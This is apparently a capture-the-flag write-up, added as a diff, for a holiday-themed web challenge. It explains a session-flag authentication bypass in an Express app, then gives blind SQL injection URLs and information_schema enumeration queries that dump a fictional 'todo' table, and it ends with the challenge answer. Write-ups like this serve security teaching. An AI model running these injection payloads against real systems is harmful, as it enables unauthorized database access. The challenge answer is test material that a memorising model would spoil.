@@ -1,0 +1,147 @@
+https://staging.jackfrosttower.com/
+frosttower-web.zip
+Objective: In Jack Frost's TODO list, what job position does Jack plan to offer Santa?
+References:
+  https://www.npmjs.com/package/express-session
+  https://github.com/mysqljs/mysql
+  https://dev.mysql.com/doc/refman/8.0/en/information-schema.html
+
+
+(Unzip frosttower-web.zip and poke around.)
+(server.js, JavaScript File, is interesting.)
+(This code snippet is interesting because it takes parameter in as an input)
+  ...
+  ...
+  app.get('/detail/:id', function(req, res, next) {
+    session = req.session;
+    var reqparam = req.params['id'];
+    var query = "SELECT * FROM uniquecontact WHERE id=";
+    if (session.uniqueID){
+        try {
+            if (reqparam.indexOf(',') > 0){
+                var ids = reqparam.split(',');
+                reqparam = "0";
+                for (var i=0; i<ids.length; i++){
+                    query += tempCont.escape(m.raw(ids[i]));
+                    query += " OR id="
+                }
+                query += "?";
+            }else{
+  ...
+  ...
+
+
+(A lot of the functions check to make sure session.uniqueID exists.)
+(The postcontact POST request seems to have a flaw where it sets the session.uniqueID when trying to add a contact that already exist.)
+(Here is the snippet)
+  ...
+  ...
+  app.post('/postcontact', function(req, res, next){
+    var fullname = xss( ReplaceAnyMatchingWords(req.body.fullname) );
+    var email = xss( ReplaceAnyMatchingWords( req.body.email) );
+    var phone = xss( ReplaceAnyMatchingWords( req.body.phone) );
+    var country = xss( ReplaceAnyMatchingWords( req.body.country ) );
+    var date = new Date();
+    var d = date.getDate();
+    var mo = date.getMonth();
+    var yr = date.getFullYear();
+    var current_hour = date.getHours();
+    var date_created = dateFormat(date, "yyyy-mm-dd hh:MM:ss");
+    tempCont.query("SELECT * from uniquecontact where email="+tempCont.escape(email), function(error, rows, fields){
+        if (error) {
+            console.log(error);
+            return res.sendStatus(500);
+        }
+        var rowlength = rows.length;
+        if (rowlength >= "1"){
+            session = req.session;
+            session.uniqueID = email;
+            req.flash('info', 'Email Already Exists');
+            res.redirect("/contact");
+        } else {
+  ...
+  ...
+
+
+(Go to the /contact page to at a contact)
+(Repeat with the same information to get the 'Email Already Exists' message. That means you're authenticated.)
+https://staging.jackfrosttower.com/contact
+
+
+(Access the /detail/:id page to see what we get)
+https://staging.jackfrosttower.com/detail/1,2,3
+
+
+(We see details for record 1, 2, and 3)
+(Try adding [and (1=1)] without brackets)
+(The %20 is URL encoding of space.)
+https://staging.jackfrosttower.com/detail/1,2,3%20and%20(1=1)
+
+
+(Try adding [and (1=0)] without brackets)
+https://staging.jackfrosttower.com/detail/1,2,3%20and%20(1=0)
+
+
+(With 1=1, record 3 displays. With 1=0, record 3 does not display.)
+(So we can replace 1=1 with SQL statements to launch a blind SQLi attack.)
+https://staging.jackfrosttower.com/detail/1000,1%20AND%20%22105%22%20=%20(select%20(ascii(substring(schema_name%20from%201%20for%201)))%20from%20information_schema.schemata%20limit%201%20OFFSET%200)
+
+
+(Put the part after /detail/ into CyberChef to URL decode to get the following.)
+1000,1 AND "105" = (select (ascii(substring(schema_name from 1 for 1))) from information_schema.schemata limit 1 OFFSET 0)
+
+
+(Record 1000 doesn't exist and record 1 does. So if the SQL statement is true, then record 1 will display. Otherwise, it will show 404 Not found!!)
+(Breakdown of the SQL statement)
+  105 = decimal ASCII of letter i
+  schema_name = the SQL column in the SQL select statement
+  substring(schema_name from 1 for 1) = get 1 character from position 1
+  ascii() = convert the character to ASCII decimal value
+  information_schema.schemata = the SQL table in the SQL select statement
+  limit 1 = return only 1 row of data
+  OFFSET 0 = return data start from row 1
+
+
+(blindSQLi.py is the script I wrote to loop through one character at a time and print out matching characters.)
+(The script has comments detailing what the code does exactly.)
+
+
+(Query the information_schema.schemata table to get all the schema names.)
+SELECT schema_name FROM information_schema.schemata
+  Row 0: information_schema
+  Row 1: encontact
+  Row 2:
+
+
+(The encontact is the only other schema. Let's get all the table names.)
+SELECT table_name FROM information_schema.tables WHERE table_schema = 'encontact'
+  Row 0: users
+  Row 1: todo
+  Row 2: emails
+  Row 3: uniquecontact
+  Row 4:
+
+
+(There is the "TODO" list. Let's get all the column names.)
+SELECT column_name FROM information_schema.columns WHERE table_name = 'todo'
+  Row 0: id
+  Row 1: note
+  Row 2: completed
+  Row 3:
+
+
+(ID is probably 1,2,3,4... Completed is likely just yes or no. Let's get the details from note.)
+SELECT note FROM todo
+  Row 0: Buy up land all around Santa's Castle
+  Row 1: Build bigger and more majestic tower next to Santa's
+  Row 2: Erode Santa's influence at the North Pole via FrostFest, the greatest Con in history
+  Row 3: Dishearten Santa's elves and encourage defection to our cause
+  Row 4: Steal Santa's sleigh technology and build a competing and way better Frosty present delivery vehicle
+  Row 5: Undermine Santa's ability to deliver presents on 12/24 through elf staff shortages, technology glitches, and assorted mayhem
+  Row 6: Force Santa to cancel Christmas
+  Row 7: SAVE THE DAY by delivering Frosty presents using merch from the Frost Tower Gift Shop to children world-wide... so the whole world sees that Frost saved the Holiday Season!!!!  Bwahahahahaha!
+  Row 8: With Santa defeated, offer the old man a job as a clerk in the Frost Tower Gift Shop so we can keep an eye on him
+  Row 9:
+
+
+Answer: clerk
